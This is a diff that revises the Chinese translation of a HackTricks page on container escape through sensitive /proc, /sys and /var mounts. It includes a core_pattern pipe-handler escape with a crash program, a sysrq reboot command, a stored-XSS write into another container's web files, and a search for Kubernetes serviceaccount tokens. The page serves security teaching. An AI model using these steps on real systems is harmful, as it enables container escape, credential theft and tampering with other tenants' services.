@@ -2,7 +2,7 @@
 
 {{#include ../../../../banners/hacktricks-training.md}}
 
-暴露 `/proc`、`/sys` 和 `/var` 而没有适当的命名空间隔离会引入重大安全风险，包括攻击面扩大和信息泄露。这些目录包含敏感文件，如果配置错误或被未经授权的用户访问，可能导致容器逃逸、主机修改或提供有助于进一步攻击的信息。例如，错误地挂载 `-v /proc:/host/proc` 可能会由于其基于路径的特性绕过 AppArmor 保护，使得 `/host/proc` 没有保护。
+暴露 `/proc`、`/sys` 和 `/var` 而没有适当的命名空间隔离会引入重大安全风险，包括攻击面扩大和信息泄露。这些目录包含敏感文件，如果配置错误或被未经授权的用户访问，可能导致容器逃逸、主机修改，或提供有助于进一步攻击的信息。例如，错误地挂载 `-v /proc:/host/proc` 可能会由于其基于路径的特性绕过 AppArmor 保护，使得 `/host/proc` 处于未保护状态。
 
 **您可以在** [**https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts**](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/sensitive-mounts)** 中找到每个潜在漏洞的更多详细信息。**
 
@@ -10,24 +10,36 @@
 
 ### `/proc/sys`
 
-该目录允许访问以修改内核变量，通常通过 `sysctl(2)`，并包含几个关注的子目录：
+该目录允许访问以修改内核变量，通常通过 `sysctl(2)`，并包含几个值得关注的子目录：
 
 #### **`/proc/sys/kernel/core_pattern`**
 
 - 在 [core(5)](https://man7.org/linux/man-pages/man5/core.5.html) 中描述。
-- 允许定义在生成核心文件时执行的程序，前 128 字节作为参数。如果文件以管道 `|` 开头，可能导致代码执行。
+- 如果您可以写入此文件，则可以写入一个管道 `|`，后跟将在崩溃发生后执行的程序或脚本的路径。
+- 攻击者可以通过执行 `mount` 找到主机中其容器的路径，并将路径写入其容器文件系统中的二进制文件。然后，崩溃一个程序以使内核在容器外执行该二进制文件。
+
 - **测试和利用示例**：
-
 ```bash
-[ -w /proc/sys/kernel/core_pattern ] && echo Yes # 测试写入访问
+[ -w /proc/sys/kernel/core_pattern ] && echo Yes # Test write access
 cd /proc/sys/kernel
-echo "|$overlay/shell.sh" > core_pattern # 设置自定义处理程序
-sleep 5 && ./crash & # 触发处理程序
+echo "|$overlay/shell.sh" > core_pattern # Set custom handler
+sleep 5 && ./crash & # Trigger handler
 ```
+检查 [this post](https://pwning.systems/posts/escaping-containers-for-fun/) 以获取更多信息。
 
+崩溃的示例程序：
+```c
+int main(void) {
+char buf[1];
+for (int i = 0; i < 100; i++) {
+buf[i] = 1;
+}
+return 0;
+}
+```
 #### **`/proc/sys/kernel/modprobe`**
 
-- 在 [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) 中详细说明。
+- 详细信息见 [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)。
 - 包含内核模块加载器的路径，用于加载内核模块。
 - **检查访问示例**：
 
@@ -37,23 +49,23 @@ ls -l $(cat /proc/sys/kernel/modprobe) # 检查对 modprobe 的访问
 
 #### **`/proc/sys/vm/panic_on_oom`**
 
-- 在 [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html) 中引用。
+- 参考 [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)。
 - 一个全局标志，控制内核在发生 OOM 条件时是否崩溃或调用 OOM 杀手。
 
 #### **`/proc/sys/fs`**
 
 - 根据 [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)，包含有关文件系统的选项和信息。
-- 写入访问可能会启用对主机的各种拒绝服务攻击。
+- 写入访问可能会启用针对主机的各种拒绝服务攻击。
 
 #### **`/proc/sys/fs/binfmt_misc`**
 
-- 允许根据其魔数注册非本地二进制格式的解释器。
+- 允许根据魔术数字注册非本地二进制格式的解释器。
 - 如果 `/proc/sys/fs/binfmt_misc/register` 可写，可能导致特权升级或 root shell 访问。
-- 相关利用和解释：
-- [Poor man's rootkit via binfmt_misc](https://github.com/toffan/binfmt_misc)
+- 相关漏洞和解释：
+- [通过 binfmt_misc 的穷人根工具包](https://github.com/toffan/binfmt_misc)
 - 深入教程：[视频链接](https://www.youtube.com/watch?v=WBC7hhgMvQQ)
 
-### `/proc` 中的其他内容
+### 其他 `/proc` 中的内容
 
 #### **`/proc/config.gz`**
 
@@ -72,12 +84,12 @@ echo b > /proc/sysrq-trigger # 重启主机
 #### **`/proc/kmsg`**
 
 - 暴露内核环形缓冲区消息。
-- 可以帮助内核利用、地址泄露，并提供敏感系统信息。
+- 可以帮助进行内核漏洞利用、地址泄漏，并提供敏感系统信息。
 
 #### **`/proc/kallsyms`**
 
 - 列出内核导出的符号及其地址。
-- 对于内核利用开发至关重要，尤其是在克服 KASLR 时。
+- 对于内核漏洞开发至关重要，尤其是在克服 KASLR 时。
 - 地址信息在 `kptr_restrict` 设置为 `1` 或 `2` 时受到限制。
 - 详细信息见 [proc(5)](https://man7.org/linux/man-pages/man5/proc.5.html)。
 
@@ -90,9 +102,9 @@ echo b > /proc/sysrq-trigger # 重启主机
 #### **`/proc/kcore`**
 
 - 以 ELF 核心格式表示系统的物理内存。
-- 读取可能泄露主机系统和其他容器的内存内容。
+- 读取可能会泄露主机系统和其他容器的内存内容。
 - 大文件大小可能导致读取问题或软件崩溃。
-- 详细用法见 [Dumping /proc/kcore in 2019](https://schlafwandler.github.io/posts/dumping-/proc/kcore/)。
+- 详细用法见 [2019 年转储 /proc/kcore](https://schlafwandler.github.io/posts/dumping-/proc/kcore/)。
 
 #### **`/proc/kmem`**
 
@@ -158,17 +170,17 @@ cat /output %%%
 #### **`/sys/firmware/efi/vars` 和 `/sys/firmware/efi/efivars`**
 
 - 暴露与 NVRAM 中的 EFI 变量交互的接口。
-- 配置错误或利用可能导致笔记本电脑砖化或主机无法启动。
+- 错误配置或利用可能导致笔记本电脑砖化或主机无法启动。
 
 #### **`/sys/kernel/debug`**
 
-- `debugfs` 提供了一个“无规则”的内核调试接口。
-- 由于其不受限制的特性，历史上存在安全问题。
+- `debugfs` 提供了一个“无规则”的调试接口给内核。
+- 由于其不受限制的性质，历史上存在安全问题。
 
 ### `/var` 漏洞
 
 主机的 **/var** 文件夹包含容器运行时套接字和容器的文件系统。
-如果该文件夹在容器内挂载，则该容器将获得对其他容器文件系统的读写访问权限
+如果该文件夹在容器内挂载，该容器将获得对其他容器文件系统的读写访问权限
 并具有 root 权限。这可能被滥用以在容器之间进行切换，导致拒绝服务，或为其他
 容器和在其中运行的应用程序设置后门。
 
@@ -217,7 +229,7 @@ REFRESH_TOKEN_SECRET=14<SNIP>ea
 / # echo '<!DOCTYPE html><html lang="en"><head><script>alert("Stored XSS!")</script></head></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/140/fs/usr/sh
 are/nginx/html/index2.html
 ```
-XSS 是通过以下方式实现的：
+XSS 已实现：
 
 ![通过挂载的 /var 文件夹存储的 XSS](/images/stored-xss-via-mounted-var-folder.png)
 
@@ -227,7 +239,7 @@ XSS 是通过以下方式实现的：
 
 ##### 访问云凭证
 
-容器可以读取 K8s serviceaccount 令牌或 AWS webidentity 令牌，这允许容器获得对 K8s 或云的未经授权访问：
+容器可以读取 K8s serviceaccount 令牌或 AWS webidentity 令牌，这使得容器能够获得对 K8s 或云的未经授权访问：
 ```bash
 / # find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
 /host-var/lib/kubelet/pods/21411f19-934c-489e-aa2c-4906f278431e/volumes/kubernetes.io~projected/kube-api-access-64jw2/..2025_01_22_12_37_42.4197672587/token
@@ -238,7 +250,7 @@ XSS 是通过以下方式实现的：
 ```
 #### Docker
 
-在Docker（或Docker Compose部署）中的利用方式完全相同，只是通常其他容器的文件系统在不同的基础路径下可用：
+在Docker（或Docker Compose部署）中的利用方式完全相同，唯一的区别是其他容器的文件系统通常在不同的基础路径下可用：
 ```bash
 $ docker info | grep -i 'docker root\|storage driver'
 Storage Driver: overlay2
